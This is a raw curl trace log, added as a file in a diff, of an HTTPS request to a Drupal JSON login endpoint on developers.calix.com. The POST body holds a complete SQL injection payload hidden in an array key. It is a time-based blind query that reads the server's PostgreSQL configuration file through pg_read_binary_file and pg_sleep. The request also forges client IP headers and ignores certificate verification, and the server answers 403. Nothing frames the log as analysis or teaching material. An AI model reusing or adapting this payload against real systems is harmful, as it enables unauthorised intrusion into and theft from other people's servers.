@@ -1,0 +1,237 @@
+* Host developers.calix.com:443 was resolved.
+* IPv6: (none)
+* IPv4: 34.8.201.231
+*   Trying 34.8.201.231:443...
+* ALPN: curl offers http/1.1
+=> Send SSL data, 5 bytes (0x5)
+0000: ....$
+* TLSv1.3 (OUT), TLS handshake, Client hello (1):
+=> Send SSL data, 1572 bytes (0x624)
+0000: ... .......A...7L..[...|_p}.....2.O.ep ...Y"!...F.....f.^w.n.h].
+0040: ..y.....<.......,.0.........+./...$.(.k.#.'.g.....9.....3.....=.
+0080: <.5./..................developers.calix.com.....................
+00c0: ................http/1.1.........1.....6.4......................
+0100: ...............................+........-.....3..........l...$..
+0140: ..}...+..:.....:C+.bI..V-.....@u..M.........OIk.....iC.2.G...:..
+0180: ..\..C...4qn.v.X%.&..$.0'BIw.{Y.bD#.W....VH+y.fY.YA.......A-....
+01c0: .........(..U..+G..........z...E...4i:d..7p)4....uJ.....v9.UU...
+0200: ;....o..^..............j9.q ...0k.+.8....Yy$.e0p.c.........79.;.
+0240: .C.`..t....,Gy;8(.yU.:..@Z...,.$..L....I...8..,.!Z2....K.....A..
+0280: .......O..N......B...m..et........-../Y.!.)......5|yf.B....UO...
+02c0: ...F..2+:...1q..r5...vA...o...+X...~..$..O....c^{z..[h7.N..)p...
+0300: 9C...Q..QD8.....nBu...z..E6...6....\.$o%Z"(.SaT....&.8|.....h...
+0340: P5.'^.Tm...#r5....b....p..$....3...R...j. .~i.....5Re.j=(q.....V
+0380: .....%".P.#G..A.zG.....C..f_.|.k .@\.R....v.V&....:.`.i...5.?'..
+03c0: ....Z.X..U.....|.2..r.&.Ew..ZQ.{K...Ze.k+4\6>y0'Z.....s.k,OF..{w
+0400: .ek.;4S.Kfa.....V\...W...8.6<k......B.B,.kT.u....X...E.l.)_.cT3)
+0440: .....-$...4.....t.w..j...+p.U;@.Q..O.F=..=../d.t..M`.{.k.Y......
+0480: .V..,4 ).J...'q9;@.X....xn...T.....**M.T)\..X..Jz[.P..'B.0S..qsa
+04c0: .h."9$w..[.H..{1..Y.)^.....w..W..X.......1..I....s.'..I.BN.T2...
+0500: ........U.g.<Hx...va%.....(..1.t@b....^k....\{........\...),TF=.
+0540: ,)..L.s.........n.`@y."..X.8IaL..D.SETT.`...o..d.......+8.onQG..
+0580: ..d......LVZ...,...I...Sn<T.........M..<p..B..b.x..3&p.=..U..5.p
+05c0: ...7..W.a....o.R{=...l.t.S.=>F.....Q.e.g.~..._...I...IF... i}U".
+0600: ...[:.-.k.{......`.f.`....[.........
+* SSL Trust: peer verification disabled
+<= Recv SSL data, 5 bytes (0x5)
+0000: .....
+* TLSv1.3 (IN), TLS handshake, Server hello (2):
+<= Recv SSL data, 1210 bytes (0x4ba)
+0000: ........VI....Tb....S.i....s.9..8..X.X ...Y"!...F.....f.^w.n.h].
+0040: ..y........n.3.d...`w.........35.}......_1y-.c.}....k.,...*...a.
+0080: .U."..uyb.....3..{n&\..x.vF.S9{.K...T".}.:.%.)..V...4Xy.{5..t.AE
+00c0: ....f...H.....J...3.N_.....x...d....N..........3B.........!...B.
+0100: ....p\.JL..&?I...V.J..u.s\...y*(....[m.*$......mg`...V..'E...\2.
+0140: ..e..w...........p...Z%,PD.......`.C.....6-.c..z..E}J!......'(..
+0180: (.PK..;m.2[....}...bU.[.2\.B..B..4B.(..g....Q.6.....W.2.v..b,.}.
+01c0: ..z.......Q^11.~...&.w.Q....e.rv....~.E.:,x.%....f-e6..`...{..._
+0200: .&d.......|...P..+c'D...F|.....(.^.....S........D....X...s.:....
+0240: ..E.7..)1a..),........E.7.Z...Jh../2.. .%X...S.G.....b.o.....N2.
+0280: ~...D...?.z.\.J.....D....._".7;J\...a..].^.[#......[...]C...9Y..
+02c0: ..?......>......=|@.i....t...HQ.b..^...................Gz.......
+0300: ..S.A>..|!.T....g...K6.`.(......._.s{Y..C,.....</..~}..\*"..t..3
+0340: .q.xx.N.?..`...7k...<.<n.....dBE..mdf..........#Qv|/...Z.I.@..cZ
+0380: j.].........eQD.-...Y..4f...g):...A+p4..c.......Y....t a....~...
+03c0: ...@...A[..Y.9.g6...f...].....-}2....l&....77.........`.......F.
+0400: 8...g..'.$M.e.............Q...t...........vy.$*...*~..5...g.E'kj
+0440:  .R..q...v....%.2s.V..nR..;e..f...i..I+....9..&9...7q..W=.......
+0480: .-T".R. ..t..W.=_.y...`..0i. .7.m..Q|d.....i.w.Z(+.$.+....
+<= Recv SSL data, 5 bytes (0x5)
+0000: .....
+* TLSv1.3 (IN), TLS change cipher, Change cipher spec (1):
+<= Recv SSL data, 1 bytes (0x1)
+0000: .
+<= Recv SSL data, 5 bytes (0x5)
+0000: .....
+<= Recv SSL data, 1 bytes (0x1)
+0000: .
+* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
+<= Recv SSL data, 25 bytes (0x19)
+0000: .................http/1.1
+* TLSv1.3 (IN), TLS handshake, Certificate (11):
+<= Recv SSL data, 3995 bytes (0xf9b)
+0000: ...........0...0...............l.......5.}.0...*.H........0;1.0.
+0040: ..U....US1.0...U....Google Trust Services1.0...U....WR30...26092
+0080: 9233609Z..261229003204Z0.1.0...U....developers.calix.com0.."0...
+00c0: *.H.............0.............@Z~....gW/.....0.<..fN.!..b57.C.iS
+0100: ...^...._...7.:)' S`.NW%...... .....Z.Q..._..E.C..j.A/...n....H5
+0140: ..U7.R..N..M.x....hS..fu.u.7....:._W\..<{
+016b: L.../..Oe.Z.vd.........L...UmX.K.......D......!_4I.8.@.5g'...O.p
+01ab: ..rY..?...u............9>?....m.{.....W0].c...........$0.. 0...U
+01eb: ...........0...U.%..0...+.......0...U.......0.0...U.......!.. .\
+022b: .b2....6.I.NK0...U.#..0...........<Mc.P1$..#.#05..+........)0'0%
+026b: ..+.....0...http://i.pki.goog/wr3.crt0...U....0...developers.cal
+02ab: ix.com0...U. ..0.0...g.....06..U.../0-0+.).'.%http://c.pki.goog/
+02eb: wr3/3WK4FGvaLfM.crl0.....+.....y............v...U;.Oz....o.O....
+032b: .^.U&....r.EK........).....G0E.!...I7./..X.'.x.uo..&......*7.O.^
+036b: ..  .....C.?wo..U..&...n.....f.T+...v..8...|..D_[....n..Y.G.i...
+03ab: ....X..............G0E. C4.tB.4.....%.TE...6......k..QA%.!..}..8
+03eb: ....z.....K...]..a.w)..oj..0...*.H.................+..{.~m......
+042b: ..g.A..Tv.;..6....Q...B_+i.|... ...c'4..<...X-O.*.50fu..Y ..fUZ.
+046b: #.DA....t.(..r..$.) .......j.&1..(YL(k.'.0j$L?.8..@...(...v8....
+04ab: .....U?.'Z.;...^.....O......h?.t.C.,.5qwZ.{F.Bx.Fp+.j........u..
+04eb: .i.....#...IU.#2..)9...^.,.....u.....G.#..)..Tb.....0...0.......
+052b: ........h.:."....KZ0...*.H........0G1.0...U....US1"0 ..U....Goog
+056b: le Trust Services LLC1.0...U....GTS Root R10...231213090000Z..29
+05ab: 0220140000Z0;1.0...U....US1.0...U....Google Trust Services1.0...
+05eb: U....WR30.."0...*.H.............0.........4u...r.....o.....5....
+062b: ..4l..z.......|.T..y.....|...8..^.3.F.oF..7c.....N2.{.#...{IC...
+066b: W.Sx....T.|...TE....Y.......OF+b^.:.*.#......^.q.}..#}.R.4......
+06ab: LY_..O.u...0F.......g.?T.'e...J,./e_..\...A[.L?...}..<S*....w.CJ
+06eb: ...H...c.%k.r..Eo.i...xL1.....s.....r............0..0...U.......
+072b: ....0...U.%..0...+.........+.......0...U.......0.......0...U....
+076b: ..........<Mc.P1$..#.#0...U.#..0.....+&q.+H'./Rf,....q>04..+....
+07ab: ....(0&0$..+.....0...http://i.pki.goog/r1.crt0+..U...$0"0 ......
+07eb: http://c.pki.goog/r/r1.crl0...U. ..0.0...g.....0...*.H..........
+082b: .....C..3H..o%......(....3*.......U...v...o.,8.<.S.j\):..=.y....
+086b: ..U...=.....7..d...,.`I..6.>.Z.j..^..'&hv.o|k.....85....a.=...?.
+08ab: Lf...o..z._bah...^../....p.*3SE+.8...DX.....~.I.[H.O..n..kS.n~.j
+08eb: F..C...@2.:2..._2SZ.F.U`.@=.......m.........:2...J...f..s.g/..1M
+092b: .\.m....,R...r.......<...ZZ.....2Ty.\.......O.......a2.S..&.....
+096b: -..Uk[KR\..2.u...0.g...kvl.J....72....Ag5p...v.a......b.C..r.PH.
+09ab: 5.p...y...p......6.hq.g..Ph:.9..?6z.....2..5.n1..yK...9....^L...
+09eb: ........_)Y.........VpZk."..g..n....U3~..Nm'.o.%..Kc*...6...xe..
+0a2b: .......f0..b0..J.......w..l.6...!...X..0...*.H........0W1.0...U.
+0a6b: ...BE1.0...U....GlobalSign nv-sa1.0...U....Root CA1.0...U....Glo
+0aab: balSign Root CA0...200619000042Z..280128000042Z0G1.0...U....US1"
+0aeb: 0 ..U....Google Trust Services LLC1.0...U....GTS Root R10.."0...
+0b2b: *.H.............0...............w.;...>...@<....}2..q........j..
+0b6b: ...K.+...................^..R..#'....c...~..^.h...ZG.M.3.N.....l
+0bab: K......d)%#....=.`.......H.M..z.....Y........1.......ml....~&.E.
+0beb: =.y..(...&......<h.S..:.+.....z..u....Vd..Oh.=......@..\....5l..
+0c2b: P...L... .3.R..2.).%*.H.r..d...........8f..c...x.{\w.v......y.W.
+0c6b: .&..............U.....K)...2%N*.eD.....I...|..@{.C..l..}...L....
+0cab: ..K.....E.v..@+.S....;......1..w.o{>...".....2..c.Qr.]....)h3.:f
+0ceb: ...&...Wex'.^I.......!............lH<@.~.Z.V<.....K.9K..?.U.n$..
+0d2b: q..........A...=:..z.7...........80..40...U...........0...U.....
+0d6b: ..0....0...U........+&q.+H'./Rf,....q>0...U.#..0...`{f.E....P/}.
+0dab: .4....K0`..+........T0R0%..+.....0...http://ocsp.pki.goog/gsr10)
+0deb: ..+.....0...http://pki.goog/gsr1/gsr1.crt02..U...+0)0'.%.#.!http
+0e2b: ://crl.pki.goog/gsr1/gsr1.crl0;..U. .4020...g.....0...g.....0...
+0e6b: +.....y....0...+.....y....0...*.H.............4...(...v..1z!..R>
+0eab: ..t.A..=5......\_...|......W.&o[..Fh.7okz...7.%Q..h...I.Z...#...
+0eeb: +.....Ij.u.......XHW.5.....o..o.......*..Ni..-.h..+s....".7..f.I
+0f2b: ..U.g.2..&.p.=.gm=|.4..2..n.jo.....K.;..7..D.~.l..F.....!.f...Ul
+0f6b: .)...f[.wIH(....3rS..5.b..$...9..~*A.R.......?..
+* TLSv1.3 (IN), TLS handshake, CERT verify (15):
+<= Recv SSL data, 264 bytes (0x108)
+0000: ...............5Z..'o.....@...D-]..T=.....Hv7..g..u..R.B.A...I_.
+0040: .I.l7..).i1..R$*c{.N8.....&.>..S........w....E.......R..... ...=
+0080: 18..7.<V...3.>..b~\..^..,Y..l.........3..:...0.t..t.i....4.+~W..
+00c0: .1...1p..O..WOd...{......oWR..A...51r_.qG....Us.&2.%....(..<....
+0100: (I..x..l
+* TLSv1.3 (IN), TLS handshake, Finished (20):
+<= Recv SSL data, 52 bytes (0x34)
+0000: ...0.?1..T.=....Y.v;.l...].wRQ.E;....%C\./])..py.<..
+=> Send SSL data, 5 bytes (0x5)
+0000: .....
+* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
+=> Send SSL data, 1 bytes (0x1)
+0000: .
+=> Send SSL data, 5 bytes (0x5)
+0000: ....E
+=> Send SSL data, 1 bytes (0x1)
+0000: .
+* TLSv1.3 (OUT), TLS handshake, Finished (20):
+=> Send SSL data, 52 bytes (0x34)
+0000: ...0.^.s.g:q.-C..-....y.g!.....+..2.f.H......z.....]
+* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384 / X25519MLKEM768 / RSASSA-PSS
+* ALPN: server accepted http/1.1
+* Server certificate:
+*   subject: CN=developers.calix.com
+*   start date: Sep 29 23:36:09 2026 GMT
+*   expire date: Dec 29 00:32:04 2026 GMT
+*   issuer: C=US; O=Google Trust Services; CN=WR3
+*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
+*   Certificate level 1: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
+*   Certificate level 2: Public key type RSA (4096/152 Bits/secBits), signed using sha256WithRSAEncryption
+*  SSL certificate verification failed, continuing anyway!
+* Established connection to developers.calix.com (34.8.201.231 port 443) from 10.1.0.185 port 36788 
+* using HTTP/1.x
+=> Send SSL data, 5 bytes (0x5)
+0000: .....
+=> Send SSL data, 1 bytes (0x1)
+0000: .
+=> Send header, 331 bytes (0x14b)
+0000: POST /index.php?q=user/login&_format=json HTTP/1.1
+0034: Host: developers.calix.com
+0050: Content-Type: application/json
+0070: Accept: application/json
+008a: User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 C
+00ca: hrome/131.0 Safari/537.36
+00e5: X-Forwarded-For: 198.18.248.101
+0106: X-Real-IP: 198.18.248.101
+0121: Content-Length: 384
+0136: Connection: close
+0149: 
+=> Send data, 384 bytes (0x180)
+0000: {"name":{"0":"u1","0||(SELECT CASE WHEN (pg_read_binary_file('/v
+0040: ar/lib/postgresql/gcsdata/postgresql.auto.conf',0,1048576,true)=
+0080: decode('2320446f206e6f74206564697420746869732066696c65206d616e75
+00c0: 616c6c79210a232049742077696c6c206265206f7665727772697474656e2062
+0100: 792074686520414c5445522053595354454d20636f6d6d616e642e0a','hex')
+0140: ) THEN pg_sleep(2) ELSE pg_sleep(0) END)::text":"a"},"pass":"a"}
+* upload completely sent off: 384 bytes
+<= Recv SSL data, 5 bytes (0x5)
+0000: ....W
+<= Recv SSL data, 1 bytes (0x1)
+0000: .
+* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
+<= Recv SSL data, 291 bytes (0x123)
+0000: ........+........o86CD.x........M;..n..$../.b.,va.!b.+.&A..@...g
+0040: aBd3....Ib.K.........-k.I..(2.d...M.xI....*.6..e.#..Y..%m R.k.;E
+0080: .K....b.....f...?.......3.....%V.n$.....K.I.l.....@..;;........x
+00c0: .......>gj.3u.....m.:..r..u.G..K...).......h.(f.d...0..E.J.p-.E.
+0100: .f?cR.YQf?...*....IAD.......t......
+* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
+<= Recv SSL data, 291 bytes (0x123)
+0000: .........a._.....o86CD.x........M;..n..$../.b.,va.!b.+.&A..@...g
+0040: aBd3....Ib.K.........-k.I..(2.d..r.H.k....K.G.}..R........'B..H_
+0080: 3s....../.G4bi...q.....OS2kX.r...Vu.T.j.FJR...b.!B.w.{O..x..G...
+00c0: .z+ao=..)M..&.Ejn.'t....V.F'.6.,......a.\.iW...`4.X....G'....y$U
+0100: .{..J.._..J.Y.hL!3IAD.S9.f..3......
+<= Recv SSL data, 5 bytes (0x5)
+0000: ....p
+<= Recv SSL data, 1 bytes (0x1)
+0000: .
+<= Recv header, 24 bytes (0x18)
+0000: HTTP/1.1 403 Forbidden
+<= Recv header, 40 bytes (0x28)
+0000: content-type: text/html; charset=UTF-8
+<= Recv header, 21 bytes (0x15)
+0000: Content-Length: 134
+<= Recv header, 17 bytes (0x11)
+0000: via: 1.1 google
+<= Recv header, 37 bytes (0x25)
+0000: date: Fri, 20 Nov 2026 22:48:48 GMT
+<= Recv header, 57 bytes (0x39)
+0000: Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
+<= Recv header, 19 bytes (0x13)
+0000: Connection: close
+<= Recv header, 2 bytes (0x2)
+0000: 
+<= Recv data, 134 bytes (0x86)
+0000: <!doctype html><meta charset="utf-8"><meta name=viewport content
+0040: ="width=device-width, initial-scale=1"><title>403</title>403 For
+0080: bidden
+* shutting down connection #0
